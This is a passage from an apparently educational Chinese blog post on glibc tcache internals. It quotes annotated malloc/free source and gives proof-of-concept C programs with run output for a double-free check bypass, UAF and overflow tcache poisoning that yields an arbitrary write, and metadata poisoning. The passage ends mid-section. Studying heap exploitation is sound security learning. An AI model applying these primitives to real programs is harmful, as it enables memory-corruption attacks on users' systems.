class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)<span class="comment">//通过counts检查是否有剩余堆块,而不是通过链表是否指向空</span></span><br><span class="line">    &#123;		</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>与glibc-2.27中区别的一点是, 2.31中判断idx对应桶子中是否有堆块,
依据是<code>tcache-&gt;counts[tc_idx] &gt; 0</code>,
不再看<code>entries</code>是否为空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// malloc_hook</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到tcache堆块不会有对齐检查</p>
<p>堆块从tcache中拿出来之前会将key归零, 防止泄露tcache地址</p>
<h5 id="free-1">free</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    size = chunksize(p);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">        <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">            tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">               trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">               2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">               coincidence before aborting.  */</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))</span><br><span class="line">            &#123;	<span class="comment">//如果检查到e-&gt;key == tcache, 说明可能存在double free ,因为自然情况下堆块中的数据等于tcache地址概率太小了</span></span><br><span class="line">                <span class="comment">//为了避免误杀, 下面还是要再次确定一下, tcache相关桶子里是否真的有这个堆块</span></span><br><span class="line">                <span class="comment">//如果真有则说明真的double free了</span></span><br><span class="line">                <span class="comment">//也就是说e-&gt;key == tcache 是这个诊断流程的导火索</span></span><br><span class="line">                tcache_entry *tmp;</span><br><span class="line">                LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">                <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<span class="comment">//从头往后遍历判断已有的堆块是不是当前要插入的堆块</span></span><br><span class="line">                     tmp;</span><br><span class="line">                     tmp = tmp-&gt;next)</span><br><span class="line">                    <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)	<span class="comment">//根据counts判断是否已经装满</span></span><br><span class="line">            &#123;</span><br><span class="line">                tcache_put(p, tc_idx);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>相比于<code>glibc-2.27</code>,
加入了放回堆块前的<code>double free</code>检查, 但是该检查很容易绕过</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="comment">//假设溢出修改chunkmem, 以绕过对key的检查</span></span><br><span class="line">    chunk[<span class="number">0</span>] = <span class="number">0</span>;	<span class="comment">//next</span></span><br><span class="line">    chunk[<span class="number">1</span>] = <span class="number">0</span>;	<span class="comment">//key</span></span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 231_df.c -o 231_df -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">231</span>_df</span><br><span class="line">chunk1 @ <span class="number">0x5572b2c55260</span></span><br><span class="line">chunk2 @ <span class="number">0x5572b2c55260</span></span><br></pre></td></tr></table></figure>
<h3 id="exploit">exploit</h3>
<p>glibc2.31中的利用手段,基本上都是针对next指针没有约束,
攻击者可以随便修改之</p>
<h4 id="use-after-free-导致-tcache-entry-poisoning">Use After Free 导致
tcache entry poisoning</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>]=<span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> * chunk_victim;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = buffer;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_victim now points to %p\n &quot;</span>,chunk_victim);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc uaf.c -o uaf -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./uaf</span><br><span class="line">chunk_victim now points to 0x7fff53e7c010</span><br></pre></td></tr></table></figure>
<h4 id="double-free造成重复引用">Double Free造成重复引用</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_dup;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">1</span>] = <span class="number">0</span>;      <span class="comment">//把key扬了</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);       <span class="comment">//double free</span></span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);			</span><br><span class="line">    chunk1_dup = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		<span class="comment">//duplicated reference</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1_dup @ %p\n&quot;</span>,chunk1_dup);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc df.c -o <span class="built_in">df</span> -w </span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./df</span><br><span class="line">chunk1 @ 0x555596ef62a0</span><br><span class="line">chunk1_dup @ 0x555596ef62a0</span><br></pre></td></tr></table></figure>
<h4 id="tcache-overflow-导致-tcache-entry-poisoning">tcache overflow
导致 tcache entry poisoning</h4>
<p>可以利用堆溢出造成任意地址读写</p>
<p>1.先后连续分配两个堆块<code>chunk1</code>,<code>chunk2</code>,使其地址物理上相邻,这样<code>chunk2</code>位于内存高处,
<code>chunk1</code>可以从低处往高处溢出</p>
<p>2.释放<code>chunk2</code>使其返回到<code>tcache</code>中</p>
<p>3.从<code>chunk1</code>开始溢出,构造<code>chunk2</code>的假头,并修改<code>chunk2</code>的<code>next</code>指针指向一个希望的地址<code>target_addr</code></p>
<p>4.再分配一次,拿出<code>chunk2</code></p>
<p>5.再分配一次,拿出<code>target_addr</code></p>
<p>需要注意的是,<code>glibc2.31</code>中,判断<code>tcache</code>中是否还有堆块的依据是<code>counts[idx]</code>计数,而不是看指针是否为空</p>
<p>因此可以找炮灰堆块填线,滥竽充数一下把<code>counts</code>垫高</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015134751799.png"
alt="image-20241015134751799" />
<figcaption aria-hidden="true">image-20241015134751799</figcaption>
</figure>
<p>假设<code>chunk1</code>和<code>chunk2</code>都是<code>malloc(0x20)</code>获取的堆块,那么站在<code>chunk1_mem</code>视角上</p>
<table>
<thead>
<tr>
<th>item</th>
<th>offset based on chunk1_mem</th>
<th>value</th>
</tr>
</thead>
<tbody>
<tr>
<td>chunk1_mem</td>
<td>0</td>
<td>pad</td>
</tr>
<tr>
<td></td>
<td>…</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_prev_size</td>
<td>+ 0x20</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_size</td>
<td>+ 0x28</td>
<td>0x31</td>
</tr>
<tr>
<td>chunk2_next</td>
<td>+ 0x30</td>
<td>target_addr</td>
</tr>
<tr>
<td>chunk2_key</td>
<td>+ 0x38</td>
<td>不变</td>
</tr>
</tbody>
</table>
<p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[] = <span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunkbait;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem_next;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line"></span><br><span class="line">    chunk1_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunkbait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">//炮灰</span></span><br><span class="line">    <span class="built_in">free</span>(chunkbait);</span><br><span class="line">    <span class="built_in">free</span>(chunk2_mem);</span><br><span class="line"></span><br><span class="line">    chunk2_mem_next = (<span class="type">char</span>*)chunk1_mem + <span class="number">0x30</span>;<span class="comment">//假设chunk1上overflow能覆盖chunk2 metadata</span></span><br><span class="line">    chunk2_mem_next[<span class="number">0</span>] = buffer;	<span class="comment">//buffer沾亲带故加入了tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(victim,<span class="string">&quot;flag&#123;bbbb&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# gcc test.c -o <span class="built_in">test</span> -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# ./test</span><br><span class="line">buffer now is flag&#123;aaaa&#125;</span><br><span class="line">buffer now is flag&#123;bbbb&#125;</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>
<h4 id="tcache-entry-poisoning导致tcache-metadata-poisoning">tcache
entry poisoning导致tcache metadata poisoning</h4>
<p>之前我们<code>tcache poisoning</code>都是这样考虑的:</p>
<p>1.malloc一个堆块</p>
<p>2.free该堆块进入tcache</p>
<p>3.UAF修改该堆块的next指针,指向目标地址</p>
<p>4.malloc拿出该堆块</p>
<p>5.malloc拿出目标地址假堆块</p>
<p>我们的目光局限在了堆块上,然而实际上对堆块的投毒,也会传染给元数据,并且还会传染给后续的堆块,考虑如下场景:</p>
<p>1.利用UAF将<code>fake_chunk</code>也加入到<code>tcache</code>中</p>
<p>这个<code>fake_chunk</code>的<code>next=0xcafebabe</code>
是一个任意值, 显然不是一个合法地址</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203432281.png"
alt="image-20241015203432281" />
<figcaption aria-hidden="true">image-20241015203432281</figcaption>
</figure>
<p>2.一个<code>malloc</code>把<code>chunk1</code>拿出来,此时桶子头指向了<code>fake_chunk</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203623434.png"
alt="image-20241015203623434" />
<figcaption aria-hidden="true">image-20241015203623434</figcaption>
</figure>
<p>3.再一个<code>malloc</code>把<code>fake_chunk</code>拿出来,那么桶子头会继承<code>fake_chunk.next</code></p>
<p>并且<code>tcache</code>中的堆块被重新分配时,其<code>key</code>会被置零,因此<code>fake_chunk_addr</code><strong>偏移8字节处的8个字节</strong>会被置零</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204025478.png"
alt="image-20241015204025478" />
<figcaption aria-hidden="true">image-20241015204025478</figcaption>
</figure>
<p>4.此时<code>free</code>一个同样大小的堆块进入<code>tcache</code>,由于元数据已经被投毒,新堆块会继承桶子头的<code>next</code>指针,也就是<code>0xcafebabe</code></p>
<p>此时如果有<code>chunk2</code>的<code>UAF</code>就可以泄露<code>0xcafebabe</code>这个值</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204205909.png"
alt="image-20241015204205909" />
<figcaption aria-hidden="true">image-20241015204205909</figcaption>
</figure>
<p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk_header[<span class="number">4</span>];</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk = (<span class="type">char</span>*)fake_chunk_header + <span class="number">0x10</span>; </span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0xcafebabe</span>;</span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;previous fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    fake_chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2.next = %p\n&quot;</span>, chunk2[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc metadata.c -o metadata -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./metadata</span><br><span class="line">previous fake_chunk.key = 0xdeadbeef</span><br><span class="line">now fake_chunk.key = (nil)</span><br><span class="line">chunk2.next = 0xcafebabe</span><br></pre></td></tr></table></figure>
<h3 id="glibc-2.38">glibc-2.38</h3>
<p>数据结构与<code>glibc-2.31</code>相比,在数据结构上并无太大变化,
但是着重加固了<code>key</code>和<code>next</code>字段的计算算法,
目的是为了尽量缓解<code>double free</code></p>
<h4 id="datastructure-2">datastructure</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p><code>key</code>不再是<code>tcache</code>基地址,而是一个随机数</p>
<p><code>next</code>不再是明文的下一个堆块地址,加了密了,盖了帽了</p>
<h4 id="algorithm-2">algorithm</h4>
<h5 id="key-init">key init</h5>
<p>在<code>malloc.c</code>中有一个静态变量<code>tcache_key</code>,
每一个被放到<code>tcahce</code>中的堆块,
都会拷贝之作为自己的<code>key</code></p>
<p>与<code>glibc-2.31</code>上直接使用<code>tcache</code>地址作为<code>key</code>不同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br></pre></td></tr></table></figure>
<p>这个值会在第一次调用<code>malloc</code>时, 在整个堆初始化之前,
率先初始化,
包括<code>fopen</code>等操作间接调用的<code>malloc</code></p>
<p>整个初始化过程是这样的</p>
